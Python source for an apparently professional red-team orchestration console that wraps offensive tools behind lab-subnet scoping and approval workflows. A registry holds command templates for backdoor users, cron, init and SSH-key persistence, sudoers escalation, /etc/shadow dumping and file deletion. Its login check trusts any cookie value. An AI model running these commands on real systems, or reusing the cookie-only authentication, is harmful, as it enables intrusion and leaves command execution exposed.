#!/usr/bin/env python3
"""
Red Team Automation Platform - Complete Live Execution
Semua modul support live execution untuk red team professional
Version: 4.0.0 - ALL MODULES LIVE
"""

from __future__ import annotations

import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import ssl
import subprocess
import threading
import time
import traceback
import urllib.error
import urllib.request
from urllib.parse import quote_plus, urlparse
import uuid
import codecs
import hashlib
import hmac
from ftplib import FTP
from datetime import datetime, timezone
from html import escape
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urljoin

try:
    import pty
    import select
except ImportError:  # pragma: no cover - Windows local sync only
    pty = None
    select = None

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from backend.assets import ASSETS, asset_map, serialize_asset
from backend.catalog import MODULES, module_map, module_playbook
from backend.lab_config import DEFAULT_CONFIG_PATH, load_lab_config, save_lab_config
from backend.store import JobStore
from backend.wahidin_check_headers import check_headers as wahidin_check_headers
from backend.workflow import ENGAGEMENTS, FINDINGS, parse_import

# ============ Base Configuration ============
BASE_DIR = Path(__file__).resolve().parent.parent
# Hindari nama file yang diawali device-reserved name Windows seperti "CON".
APP_DB = BASE_DIR / "backend" / "data" / "console.sqlite3"
LAB_CONFIG = load_lab_config()
ALLOWED_SUBNET_STRINGS = tuple(LAB_CONFIG["allowed_subnets"])
LAB_PROFILES = tuple(LAB_CONFIG["lab_profiles"])
LAB_CONFIG_SOURCE = str(LAB_CONFIG["source"])
LAB_CONFIG_PATH = str(LAB_CONFIG["path"])
ALLOWED_SUBNETS = tuple(ipaddress.ip_network(cidr) for cidr in ALLOWED_SUBNET_STRINGS)
LAB_CONFIG_MTIME: float | None = None

# ============ Timeouts ============
EXECUTION_MODE = "live-execution"
DESTRUCTIVE_MODE = os.getenv("REDTEAM_CONSOLE_DESTRUCTIVE_MODE", "disabled")
JOB_HEARTBEAT_TIMEOUT_SECONDS = 600
COMMAND_TIMEOUT_SECONDS = 900

# ============ Core Imports & Init ============
JOB_STORE = JobStore(APP_DB)
MODULE_BY_ID = module_map()
ASSET_BY_IP = asset_map()
SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
ACTIVE_PROCESSES: dict[str, subprocess.Popen[str]] = {}
STOP_REQUESTS: set[str] = set()
COMMAND_RESULT_CACHE: dict[str, dict[str, dict[str, Any]]] = {}
PROCESS_LOCK = threading.Lock()
INTERACTIVE_SESSIONS: dict[str, dict[str, Any]] = {}
INTERACTIVE_SESSION_LOCK = threading.Lock()
RANGE_SAVE_PASSWORD = os.getenv("REDTEAM_CONSOLE_RANGE_PASSWORD", "")
RANGE_SAVE_PASSWORD_HASH = os.getenv("REDTEAM_CONSOLE_RANGE_PASSWORD_HASH", "").strip().lower()
DEFAULT_SUDO_PASSWORD = os.getenv("REDTEAM_CONSOLE_DEFAULT_SUDO_PASSWORD", "kali")
ANSI_ESCAPE_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~]|\][^\x07]*(?:\x07|\x1B\\))")
INTERACTIVE_TOOL_LABELS = {
    "metasploit",
    "ssh",
    "smbclient",
    "rpcclient",
    "mysql",
    "psql",
    "redis-cli",
    "ftp",
    "telnet",
}
CHAIN_PRESETS: dict[str, dict[str, Any]] = {
    "full-chain-default": {
        "id": "full-chain-default",
        "label": "Full Chain Default",
        "description": "Menjalankan seluruh modul yang diizinkan oleh risk mode assessment saat ini.",
        "recommended_risk_mode": "safe",
        "phase_ids": (),
        "priority_module_ids": (),
    },
    "quick-safe": {
        "id": "quick-safe",
        "label": "Quick Safe",
        "description": "Coverage cepat untuk service discovery, fingerprint, header, dan baseline TLS tanpa memperluas workflow terlalu jauh.",
        "recommended_risk_mode": "safe",
        "phase_ids": ("recon", "baseline"),
        "priority_module_ids": (
            "recon-service-scan",
            "recon-host-discovery",
            "baseline-web-fingerprint",
            "web-security-header-audit",
            "baseline-tls-dns-review",
        ),
    },
    "deep-enum": {
        "id": "deep-enum",
        "label": "Deep Enumeration",
        "description": "Memperluas enumerasi host, DNS, route, misconfiguration, dan observasi teknologi web secara komprehensif namun tetap non-destruktif.",
        "recommended_risk_mode": "deep",
        "phase_ids": ("recon", "baseline"),
        "priority_module_ids": (
            "recon-service-scan",
            "recon-host-discovery",
            "recon-dns-enumeration",
            "recon-amass-expansion",
            "baseline-web-fingerprint",
            "baseline-content-discovery",
            "baseline-nikto-review",
            "baseline-gobuster-routes",
            "baseline-tls-dns-review",
            "web-security-header-audit",
        ),
    },
    "validation-deep": {
        "id": "validation-deep",
        "label": "Validation Deep",
        "description": "Mengutamakan validasi temuan dan hardening backlog lintas web, DNS, route, dan file exposure yang masih aman/non-destruktif.",
        "recommended_risk_mode": "deep",
        "phase_ids": ("recon", "baseline", "weapon", "delivery"),
        "priority_module_ids": (
            "recon-service-scan",
            "baseline-web-fingerprint",
            "web-security-header-audit",
            "baseline-content-discovery",
            "baseline-nikto-review",
            "baseline-gobuster-routes",
            "baseline-tls-dns-review",
            "recon-dns-enumeration",
            "recon-amass-expansion",
        ),
    },
    "intrusive-validation": {
        "id": "intrusive-validation",
        "label": "Intrusive Validation",
        "description": "Mode validasi aktif yang hanya boleh berjalan jika assessment dan approval sudah tersedia untuk modul berisiko intrusive.",
        "recommended_risk_mode": "intrusive",
        "phase_ids": (),
        "priority_module_ids": (),
    },
}

app = FastAPI(title="Red Team Automation Platform - Complete")
app.mount("/static", StaticFiles(directory=BASE_DIR), name="static")

PUBLIC_PATH_PREFIXES = (
    "/static",
    "/login",
    "/favicon.ico",
    "/api/health",
)


def _safe_next_path(next_path: str | None) -> str:
    if not next_path or not next_path.startswith("/"):
        return "/"
    if next_path.startswith("//"):
        return "/"
    return next_path


def _render_login_page(next_url: str = "/", error: str | None = None) -> HTMLResponse:
    template = (BASE_DIR / "login.html").read_text(encoding="utf-8")
    error_block = ""
    if error:
        error_block = f'<div class="login-alert">{escape(error)}</div>'
    html = (
        template
        .replace("__NEXT_URL__", escape(_safe_next_path(next_url), quote=True))
        .replace("__ERROR_BLOCK__", error_block)
    )
    return HTMLResponse(content=html)


@app.middleware("http")
async def require_login(request: Request, call_next):
    request.state.current_user = request.cookies.get("redteam_console_user")
    path = request.url.path
    if any(path.startswith(prefix) for prefix in PUBLIC_PATH_PREFIXES):
        return await call_next(request)

    if request.state.current_user:
        return await call_next(request)

    destination = path
    if request.url.query:
        destination = f"{path}?{request.url.query}"
    login_url = f"/login?next={quote_plus(destination)}"
    if path.startswith("/api/"):
        return JSONResponse(
            status_code=401,
            content={
                "detail": "Authentication required",
                "login_url": login_url
            }
        )
    return RedirectResponse(url=login_url, status_code=303)

# ============ Data Models ============
class JobRequest(BaseModel):
    target: str = Field(..., examples=["10.10.10.20"])
    target_kind: str = Field(default="ip")
    note: str = Field(default="", max_length=160)
    execution_profile: str = Field(default="balanced")

class AssessmentCreateRequest(BaseModel):
    target: str = Field(..., examples=["10.10.10.20"])
    target_kind: str = Field(default="ip")
    assessment_type: str = Field(default="internal")
    risk_mode: str = Field(default="safe")
    chain_preset: str = Field(default="full-chain-default")
    operator_name: str = Field(default="operator")
    ticket_ref: str = Field(default="")
    note: str = Field(default="", max_length=240)

class AssessmentApprovalRequest(BaseModel):
    module_id: str
    approved_by: str = Field(default="operator")
    ticket_ref: str = Field(default="")
    reason: str = Field(default="Approval granted for intrusive validation")
    expires_at: str = Field(default="")

class ChainApprovalRequest(BaseModel):
    approved_by: str = Field(default="operator")
    ticket_ref: str = Field(default="")
    reason: str = Field(default="Bulk approval granted for intrusive validation chain")
    risk_mode: str = Field(default="intrusive")
    chain_preset: str = Field(default="full-chain-default")
    expires_at: str = Field(default="")

class FindingStatusRequest(BaseModel):
    status: str = Field(default="open")
    note: str = Field(default="", max_length=240)
    owner: str = Field(default="", max_length=120)
    due_date: str = Field(default="")
    sla: str = Field(default="", max_length=80)

class ModuleJobRequest(JobRequest):
    module_id: str
    execution_profile: str = Field(default="balanced")
    assessment_id: str = Field(default="")
    risk_mode: str = Field(default="safe")

class ChainJobRequest(JobRequest):
    assessment_id: str = Field(default="")
    risk_mode: str = Field(default="safe")
    chain_preset: str = Field(default="full-chain-default")

class ImportRequest(BaseModel):
    tool_name: str = Field(default="generic")
    target: str = Field(..., examples=["10.10.10.20"])
    target_kind: str = Field(default="ip")
    content: str = Field(default="")

class ConfigUpdateRequest(BaseModel):
    allowed_subnets: list[str] = Field(default_factory=list)
    password: str = Field(default="")


def apply_lab_config(config: dict[str, Any]) -> None:
    global LAB_CONFIG, ALLOWED_SUBNET_STRINGS, LAB_PROFILES, LAB_CONFIG_SOURCE, LAB_CONFIG_PATH, ALLOWED_SUBNETS, LAB_CONFIG_MTIME
    subnet_strings = tuple(str(item).strip() for item in config["allowed_subnets"])
    subnet_networks: list[ipaddress._BaseNetwork] = []
    for cidr in subnet_strings:
        try:
            subnet_networks.append(ipaddress.ip_network(cidr, strict=False))
        except ValueError as error:
            raise HTTPException(status_code=400, detail=f"Subnet tidak valid: {cidr}") from error

    LAB_CONFIG = config
    ALLOWED_SUBNET_STRINGS = subnet_strings
    LAB_PROFILES = tuple(config["lab_profiles"])
    LAB_CONFIG_SOURCE = str(config["source"])
    LAB_CONFIG_PATH = str(config["path"])
    ALLOWED_SUBNETS = tuple(subnet_networks)
    try:
        LAB_CONFIG_MTIME = Path(LAB_CONFIG_PATH).stat().st_mtime
    except OSError:
        LAB_CONFIG_MTIME = None


def sync_lab_config_from_disk(force: bool = False) -> None:
    config_path = Path(LAB_CONFIG_PATH or DEFAULT_CONFIG_PATH)
    try:
        current_mtime = config_path.stat().st_mtime
    except OSError:
        current_mtime = None

    if force or current_mtime != LAB_CONFIG_MTIME:
        apply_lab_config(load_lab_config())

class DestructiveApprovalRequest(BaseModel):
    action: str
    approved_by: str = Field(default="operator")
    ticket_ref: str = Field(default="")
    reason: str = Field(default="Approval granted for destructive action")
    expires_at: str = Field(default="")

class DestructiveActionRequest(BaseModel):
    action: str
    target: str
    assessment_id: str
    confirmation_token: str

class ExploitRequest(BaseModel):
    target: str
    exploit_type: str
    params: dict[str, Any] = Field(default_factory=dict)

class ToolCommandExecuteRequest(BaseModel):
    tool_name: str
    command: str
    sudo_password: str = Field(default="", max_length=256)
    timeout: int = Field(default=120, ge=5, le=300)

class InteractiveToolSessionOpenRequest(BaseModel):
    tool_name: str
    command: str
    sudo_password: str = Field(default="", max_length=256)

class InteractiveToolSessionInputRequest(BaseModel):
    command: str = Field(default="", max_length=1000)

# ============ Extended Tool Definitions ============
TOOL_COMMAND_ALIASES: dict[str, list[str] | None] = {
    "nmap": ["nmap"],
    "masscan": ["masscan"],
    "rustscan": ["rustscan"],
    "subfinder": ["subfinder"],
    "shuffledns": ["shuffledns"],
    "chaos": ["chaos"],
    "waybackurls": ["waybackurls"],
    "gau": ["gau", "getallurls"],
    "fierce": ["fierce"],
    "dnsrecon": ["dnsrecon"],
    "dnsx": ["dnsx"],
    "amass": ["amass"],
    "python3": ["python3"],
    "httpx": ["httpx"],
    "whatweb": ["whatweb"],
    "wappalyzer": ["wappalyzer"],
    "nuclei": ["nuclei"],
    "katana": ["katana"],
    "dalfox": ["dalfox"],
    "xsstrike": ["xsstrike"],
    "ffuf": ["ffuf"],
    "gobuster": ["gobuster"],
    "curl": ["curl"],
    "sqlmap": ["sqlmap"],
    "nikto": ["nikto"],
    "wpscan": ["wpscan"],
    "jwt-tool": ["jwt-tool", "jwt"],
    "burpsuite": ["burpsuite"],
    "hydra": ["hydra"],
    "medusa": ["medusa"],
    "crowbar": ["crowbar"],
    "kerbrute": ["kerbrute"],
    "hashcat": ["hashcat"],
    "john": ["john"],
    "ncrack": ["ncrack"],
    "patator": ["patator"],
    "metasploit": ["msfconsole", "msfvenom"],
    "searchsploit": ["searchsploit"],
    "commix": ["commix"],
    "beef": ["beef-xss"],
    "bettercap": ["bettercap"],
    "responder": ["responder"],
    "mitm6": ["mitm6"],
    "bloodhound": ["bloodhound"],
    "bloodhound-python": ["bloodhound-python"],
    "enum4linux-ng": ["enum4linux-ng"],
    "impacket": ["impacket"],
    "mimikatz": ["mimikatz"],
    "proxychains": ["proxychains4", "proxychains"],
    "chisel": ["chisel"],
    "ssh": ["ssh"],
    "openssl": ["openssl"],
    "sslyze": ["sslyze"],
    "dig": ["dig"],
    "rpcclient": ["rpcclient"],
    "smbclient": ["smbclient"],
    "ldapsearch": ["ldapsearch"],
    "autoruns": ["autoruns"],
    "schtasks": ["schtasks"],
    "crontab": ["crontab"],
    "systemctl": ["systemctl"],
    "sc": ["sc"],
    "reg": ["reg"],
    "tcpdump": ["tcpdump"],
    "wireshark": ["wireshark"],
    "zeek": ["zeek"],
    "suricata": ["suricata"],
    "ncat": ["ncat"],
    "socat": ["socat"],
    "ngrok": ["ngrok"],
    "jq": ["jq"],
    "pandoc": ["pandoc"],
    "graphviz": ["dot"],
    "yara": ["yara"],
    "strings": ["strings"],
    "file": ["file"],
    "sha256sum": ["sha256sum"],
    "swaks": ["swaks"],
    "mailparser": ["mailparser", "eml-parser"],
    "urlscan": ["urlscan"],
    "mitmproxy": ["mitmproxy"],
    "sigma": None,
    "sysmon": None,
    "markdown": None,
    "otp-review": None,
    "killchain": None,
}

UNMODELED_WSL_TOOLS: tuple[dict[str, str], ...] = (
    {"label": "amass", "command": "amass", "phase_id": "recon", "phase_label": "Reconnaissance", "rationale": "asset and subdomain expansion for lab scoping"},
    {"label": "nikto", "command": "nikto", "phase_id": "baseline", "phase_label": "Baseline Assessment", "rationale": "web misconfiguration and known exposure review"},
    {"label": "gobuster", "command": "gobuster", "phase_id": "baseline", "phase_label": "Baseline Assessment", "rationale": "content and route discovery on approved targets"},
    {"label": "hashcat", "command": "hashcat", "phase_id": "objective", "phase_label": "Actions on Objectives", "rationale": "offline credential exposure impact simulation"},
    {"label": "john", "command": "john", "phase_id": "objective", "phase_label": "Actions on Objectives", "rationale": "offline password review for credential impact workflows"},
)

# ============ Destructive Action Registry ============
DESTRUCTIVE_ACTIONS = {
    "service_stop": {"description": "Stop critical services", "severity": "critical", "command": "systemctl stop {service}", "recovery": "systemctl start {service}"},
    "service_start": {"description": "Start services", "severity": "medium", "command": "systemctl start {service}", "recovery": "systemctl stop {service}"},
    "file_delete": {"description": "Delete files (DESTRUCTIVE!)", "severity": "critical", "command": "rm -f {file}", "recovery": "Restore from backup"},
    "user_create": {"description": "Create backdoor user", "severity": "high", "command": "useradd -m -s /bin/bash {username} && echo '{username}:{password}' | chpasswd", "recovery": "userdel -r {username}"},
    "user_delete": {"description": "Delete user (DESTRUCTIVE!)", "severity": "critical", "command": "userdel -rf {username}", "recovery": "Recreate user"},
    "firewall_bypass": {"description": "Add firewall rule", "severity": "high", "command": "iptables -I INPUT -s {source} -j ACCEPT", "recovery": "iptables -D INPUT -s {source} -j ACCEPT"},
    "cron_persistence": {"description": "Install cron persistence", "severity": "high", "command": "echo '{schedule} {command}' >> /etc/crontab", "recovery": "Remove cron entry"},
    "file_upload": {"description": "Upload backdoor", "severity": "high", "command": "scp -o StrictHostKeyChecking=no {local} {user}@{target}:{remote}", "recovery": "Delete file"},
    "file_download": {"description": "Download sensitive file", "severity": "high", "command": "scp -o StrictHostKeyChecking=no {user}@{target}:{remote} {local}", "recovery": "Delete file"},
    "process_kill": {"description": "Kill process", "severity": "critical", "command": "kill -9 {pid}", "recovery": "Restart process"},
    "credentials_dump": {"description": "Dump credentials", "severity": "critical", "command": "cat /etc/shadow", "recovery": "Reset all compromised credentials"},
    "persistence_install": {"description": "Install persistence", "severity": "high", "command": "cp {file} /etc/init.d/ && update-rc.d {file} defaults", "recovery": "update-rc.d -f {file} remove"},
    "ssh_key_install": {"description": "Install SSH backdoor", "severity": "high", "command": "mkdir -p .ssh && echo '{ssh_key}' >> .ssh/authorized_keys", "recovery": "Remove SSH key"},
    "password_change": {"description": "Change password", "severity": "high", "command": "echo '{username}:{new_password}' | chpasswd", "recovery": "Reset password"},
    "sudo_install": {"description": "Grant sudo privileges", "severity": "critical", "command": "echo '{username} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "recovery": "Remove from /etc/sudoers"},
}

# ============ Utility Functions ============
def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def parse_iso_timestamp(value: str | None) -> datetime | None:
    if not value:
        return None
    try:
        return datetime.fromisoformat(value)
    except ValueError:
        return None

def normalize_target_kind(value: str | None) -> str:
    kind = str(value or "ip").strip().lower()
    if kind not in {"ip", "cidr", "domain", "hostname", "url"}:
        return "ip"
    return kind


def validate_ip_against_allowed_subnets(value: str) -> str:
    sync_lab_config_from_disk()
    try:
        address = ipaddress.ip_address(value)
    except ValueError as error:
        raise HTTPException(status_code=400, detail="Target harus berupa IPv4/IPv6 yang valid.") from error
    if not any(address in subnet for subnet in ALLOWED_SUBNETS):
        allowed_text = ", ".join(str(subnet) for subnet in ALLOWED_SUBNETS)
        raise HTTPException(status_code=400, detail=f"Target di luar subnet lab yang diizinkan. Gunakan alamat dalam: {allowed_text}.")
    return str(address)


def validate_cidr_against_allowed_subnets(value: str) -> str:
    sync_lab_config_from_disk()
    try:
        network = ipaddress.ip_network(value, strict=False)
    except ValueError as error:
        raise HTTPException(status_code=400, detail="Target CIDR tidak valid.") from error
    if not all(any(candidate.subnet_of(allowed) for allowed in ALLOWED_SUBNETS) for candidate in [network]):
        allowed_text = ", ".join(str(subnet) for subnet in ALLOWED_SUBNETS)
        raise HTTPException(status_code=400, detail=f"CIDR target di luar subnet lab yang diizinkan. Gunakan scope dalam: {allowed_text}.")
    return str(network)


def validate_host_label(value: str, *, detail: str) -> str:
    candidate = str(value or "").strip().lower().rstrip('.')
    if not candidate:
        raise HTTPException(status_code=400, detail=detail)
    if len(candidate) > 253:
        raise HTTPException(status_code=400, detail=detail)
    labels = candidate.split('.')
    if any(not label or len(label) > 63 for label in labels):
        raise HTTPException(status_code=400, detail=detail)
    for label in labels:
        if not re.fullmatch(r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?", label):
            raise HTTPException(status_code=400, detail=detail)
    return candidate


def validate_url_target(value: str) -> str:
    raw = str(value or "").strip()
    parsed = urlparse(raw)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise HTTPException(status_code=400, detail="Target URL harus berupa http/https yang valid.")
    hostname = parsed.hostname or ""
    validate_host_label(hostname, detail="Hostname pada target URL tidak valid.")
    return raw


def validate_target(target: str, target_kind: str = "ip") -> str:
    kind = normalize_target_kind(target_kind)
    if kind == "ip":
        return validate_ip_against_allowed_subnets(target)
    if kind == "cidr":
        return validate_cidr_against_allowed_subnets(target)
    if kind == "domain":
        return validate_host_label(target, detail="Target domain tidak valid.")
    if kind == "hostname":
        return validate_host_label(target, detail="Target hostname tidak valid.")
    if kind == "url":
        return validate_url_target(target)
    return validate_ip_against_allowed_subnets(target)

def tool_status(label: str) -> dict[str, Any]:
    commands = TOOL_COMMAND_ALIASES.get(label, [label])
    if commands is None:
        return {"label": label, "kind": "conceptual", "installed": None, "command": None}
    for command in commands:
        if shutil.which(command):
            return {"label": label, "kind": "binary", "installed": True, "command": command}
    return {"label": label, "kind": "binary", "installed": False, "command": commands[0]}

def check_tool_availability(tool_name: str) -> bool:
    status = tool_status(tool_name)
    return status.get("installed", False) is True

def allowed_tool_commands(tool_name: str) -> set[str]:
    aliases = TOOL_COMMAND_ALIASES.get(tool_name)
    if not aliases:
        return set()
    return {str(alias).strip() for alias in aliases if str(alias).strip()}

def validate_literal_targets_in_command(command: str) -> None:
    for candidate in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b", command):
        if "/" in candidate:
            validate_cidr_against_allowed_subnets(candidate)
        else:
            validate_ip_against_allowed_subnets(candidate)

def validate_tool_command_request(tool_name: str, command: str) -> str:
    normalized_tool = str(tool_name or "").strip().lower()
    if normalized_tool not in TOOL_COMMAND_ALIASES:
        raise HTTPException(status_code=404, detail="Tool not found")

    status = tool_status(normalized_tool)
    if status.get("kind") == "conceptual":
        raise HTTPException(status_code=400, detail="Tool conceptual tidak bisa dieksekusi langsung.")
    if status.get("installed") is not True:
        raise HTTPException(status_code=400, detail="Tool belum tersedia di environment.")

    raw_command = str(command or "").strip()
    if not raw_command:
        raise HTTPException(status_code=400, detail="Command tidak boleh kosong.")
    if len(raw_command) > 600:
        raise HTTPException(status_code=400, detail="Command terlalu panjang untuk quick execute.")
    if any(token in raw_command for token in ("\n", "\r", "&&", "||", ";", "`", "$(", ">", "<")):
        raise HTTPException(status_code=400, detail="Shell chaining, redirect, atau subshell tidak didukung di quick execute.")

    try:
        parts = shlex.split(raw_command, posix=True)
    except ValueError as error:
        raise HTTPException(status_code=400, detail=f"Command tidak valid: {error}") from error

    if not parts:
        raise HTTPException(status_code=400, detail="Command tidak boleh kosong.")

    base_command = parts[0]
    effective_base_command = parts[1] if base_command == "sudo" and len(parts) > 1 else base_command
    if base_command == "sudo" and len(parts) == 1:
        raise HTTPException(status_code=400, detail="Command sudo tidak lengkap.")
    if base_command == "sudo" and any(part in {"-i", "--login", "-s"} for part in parts[1:3]):
        raise HTTPException(status_code=400, detail="Mode sudo interaktif tidak didukung di quick execute.")
    if effective_base_command not in allowed_tool_commands(normalized_tool):
        raise HTTPException(status_code=400, detail=f"Command harus diawali alias resmi untuk tool {normalized_tool}.")

    validate_literal_targets_in_command(raw_command)
    return raw_command

def command_requires_sudo_password(command: str) -> bool:
    try:
        parts = shlex.split(str(command or "").strip(), posix=True)
    except ValueError:
        return False
    return bool(parts and parts[0] == "sudo")

def wrap_command_with_sudo_password(command: str) -> str:
    try:
        parts = shlex.split(str(command or "").strip(), posix=True)
    except ValueError:
        return str(command or "").strip()
    if not parts:
        return str(command or "").strip()
    if parts[0] != "sudo":
        parts = ["sudo", *parts]
    if "-S" not in parts:
        parts.insert(1, "-S")
    if "-p" not in parts:
        parts[2:2] = ["-p", ""]
    return shlex.join(parts)

def stderr_indicates_sudo_password(stderr: str) -> bool:
    text = str(stderr or "").lower()
    return "sudo:" in text and ("password is required" in text or "terminal is required" in text)

def effective_base_command_from_parts(parts: list[str]) -> str:
    if not parts:
        return ""
    if parts[0] != "sudo":
        return parts[0]
    index = 1
    options_with_value = {"-p", "-u", "-g", "-h", "-C"}
    while index < len(parts):
        token = parts[index]
        if token in options_with_value:
            index += 2
            continue
        if token.startswith("-"):
            index += 1
            continue
        return token
    return "sudo"

def is_interactive_tool(label: str, command: str = "") -> bool:
    normalized_label = str(label or "").strip().lower()
    if normalized_label in INTERACTIVE_TOOL_LABELS:
        return True
    try:
        parts = shlex.split(str(command or "").strip(), posix=True)
    except ValueError:
        return False
    base = effective_base_command_from_parts(parts)
    return base in {"msfconsole", "ssh", "smbclient", "rpcclient", "mysql", "psql", "redis-cli", "ftp", "telnet"}

def sanitize_terminal_output(chunk: str) -> str:
    if not chunk:
        return ""
    cleaned = ANSI_ESCAPE_RE.sub("", str(chunk))
    cleaned = cleaned.replace("\r\n", "\n").replace("\r", "")
    cleaned = cleaned.replace("\x08", "")
    cleaned = cleaned.replace("\x00", "")
    return cleaned

def append_interactive_output(session: dict[str, Any], chunk: str) -> None:
    if not chunk:
        return
    combined = f"{session.get('output', '')}{sanitize_terminal_output(chunk)}"
    if len(combined) > 120000:
        combined = combined[-120000:]
    session["output"] = combined
    session["updated_at"] = now_iso()

def serialize_interactive_session(session: dict[str, Any]) -> dict[str, Any]:
    return {
        "id": session["id"],
        "tool_name": session["tool_name"],
        "command": session["command"],
        "started_command": session.get("started_command", session["command"]),
        "status": session.get("status", "running"),
        "created_at": session.get("created_at"),
        "updated_at": session.get("updated_at"),
        "exit_code": session.get("exit_code"),
        "output": session.get("output", "")[-12000:],
        "interactive": True,
    }

def interactive_session_reader(session_id: str) -> None:
    if select is None:
        return
    while True:
        with INTERACTIVE_SESSION_LOCK:
            session = INTERACTIVE_SESSIONS.get(session_id)
        if not session:
            return
        process = session.get("process")
        master_fd = session.get("master_fd")
        if process is None or master_fd is None:
            return
        try:
            ready, _, _ = select.select([master_fd], [], [], 0.25)
            if ready:
                data = os.read(master_fd, 4096)
                if data:
                    with INTERACTIVE_SESSION_LOCK:
                        live_session = INTERACTIVE_SESSIONS.get(session_id)
                        if live_session:
                            append_interactive_output(live_session, data.decode("utf-8", "replace"))
                else:
                    break
        except OSError:
            break
        if process.poll() is not None:
            break

    with INTERACTIVE_SESSION_LOCK:
        session = INTERACTIVE_SESSIONS.get(session_id)
        if session:
            process = session.get("process")
            session["status"] = "stopped"
            session["exit_code"] = process.poll() if process else None
            session["updated_at"] = now_iso()
            master_fd = session.get("master_fd")
            if master_fd is not None:
                try:
                    os.close(master_fd)
                except OSError:
                    pass
                session["master_fd"] = None

def close_interactive_session_internal(session_id: str) -> dict[str, Any] | None:
    with INTERACTIVE_SESSION_LOCK:
        session = INTERACTIVE_SESSIONS.get(session_id)
        if not session:
            return None
        process = session.get("process")
        if process and process.poll() is None:
            try:
                process.terminate()
                process.wait(timeout=5)
            except Exception:
                try:
                    process.kill()
                except Exception:
                    pass
        master_fd = session.get("master_fd")
        if master_fd is not None:
            try:
                os.close(master_fd)
            except OSError:
                pass
            session["master_fd"] = None
        session["status"] = "closed"
        session["exit_code"] = process.poll() if process else None
        session["updated_at"] = now_iso()
        return serialize_interactive_session(session)

def first_existing_path(candidates: list[str], fallback: str) -> str:
    for candidate in candidates:
        if Path(candidate).exists():
            return candidate
    return fallback

def preferred_small_web_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/wordlists/seclists/Discovery/Web_Content/common.txt",
            "/usr/share/wordlists/dirb/common.txt",
        ],
        "/usr/share/wordlists/dirb/common.txt",
    )

def preferred_small_password_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/wordlists/rockyou.txt",
        ],
        "/usr/share/wordlists/rockyou.txt",
    )

def preferred_small_user_wordlist() -> str:
    return first_existing_path(
        [
            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
            "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
            "users.txt",
        ],
        "users.txt",
    )

def normalize_execution_profile(value: str | None, *, force_fast: bool = False) -> str:
    if force_fast:
        return "fast"
    profile = str(value or "balanced").strip().lower()
    if profile not in {"fast", "balanced", "deep"}:
        return "balanced"
    return profile


def normalize_risk_mode(value: str | None) -> str:
    risk_mode = str(value or "safe").strip().lower()
    if risk_mode not in {"safe", "deep", "intrusive"}:
        return "safe"
    return risk_mode


def normalize_chain_preset(value: str | None) -> str:
    preset_id = str(value or "full-chain-default").strip().lower()
    return preset_id if preset_id in CHAIN_PRESETS else "full-chain-default"


def chain_preset_definition(preset_id: str | None) -> dict[str, Any]:
    return CHAIN_PRESETS[normalize_chain_preset(preset_id)]


def module_allowed_in_risk_mode(module, risk_mode: str) -> bool:
    normalized_mode = normalize_risk_mode(risk_mode)
    if normalized_mode == "safe":
        return bool(module.safe_in_chain) and module.risk_class == "safe"
    if normalized_mode == "deep":
        return bool(module.deep_in_chain) and module.risk_class in {"safe", "deep"}
    return module.risk_class in {"safe", "deep", "intrusive"}


def select_chain_modules(risk_mode: str, chain_preset: str = "full-chain-default") -> list[str]:
    normalized_mode = normalize_risk_mode(risk_mode)
    preset = chain_preset_definition(chain_preset)
    phase_ids = {str(item) for item in preset.get("phase_ids", ()) if str(item)}
    priority_module_ids = [str(item) for item in preset.get("priority_module_ids", ()) if str(item)]
    priority_set = set(priority_module_ids)
    selected: list[str] = []
    deferred: list[str] = []
    for module in MODULES:
        if module.id == "read-sensitive-file":
            continue
        if not module_allowed_in_risk_mode(module, normalized_mode):
            continue
        if phase_ids and module.phase_id not in phase_ids and module.id not in priority_set:
            continue
        if module.id in priority_set:
            deferred.append(module.id)
        else:
            selected.append(module.id)
    ordered_priority = [module_id for module_id in priority_module_ids if module_id in deferred]
    trailing = [module_id for module_id in deferred if module_id not in ordered_priority]
    return ordered_priority + selected + trailing


def module_run_index(job: dict[str, Any]) -> dict[str, dict[str, Any]]:
    runs = job.get("module_runs", []) if isinstance(job, dict) else []
    return {str(run.get("module_id")): run for run in runs if isinstance(run, dict) and run.get("module_id")}


def completed_module_ids(job: dict[str, Any]) -> set[str]:
    completed: set[str] = set()
    for module_id, run in module_run_index(job).items():
        if str(run.get("status") or "") in {"completed", "failed", "stopped"}:
            completed.add(module_id)
    return completed


def recommended_next_modules_for_job(job: dict[str, Any], limit: int = 5) -> list[dict[str, Any]]:
    risk_mode = normalize_risk_mode(str(runtime_meta(job).get("risk_mode") or "safe"))
    chain_preset = normalize_chain_preset(str(runtime_meta(job).get("chain_preset") or "full-chain-default"))
    allowed = select_chain_modules(risk_mode, chain_preset)
    completed = completed_module_ids(job)
    recommendations: list[dict[str, Any]] = []
    for module_id in allowed:
        if module_id in completed:
            continue
        module = MODULE_BY_ID[module_id]
        recommendations.append(
            {
                "module_id": module.id,
                "title": module.title,
                "phase_label": module.phase_label,
                "risk_class": module.risk_class,
                "requires_approval": module.requires_approval,
                "operator_focus": module_playbook(module).operator_focus,
            }
        )
        if len(recommendations) >= limit:
            break
    return recommendations


def assessment_jobs(assessment_id: str) -> list[dict[str, Any]]:
    jobs: list[dict[str, Any]] = []
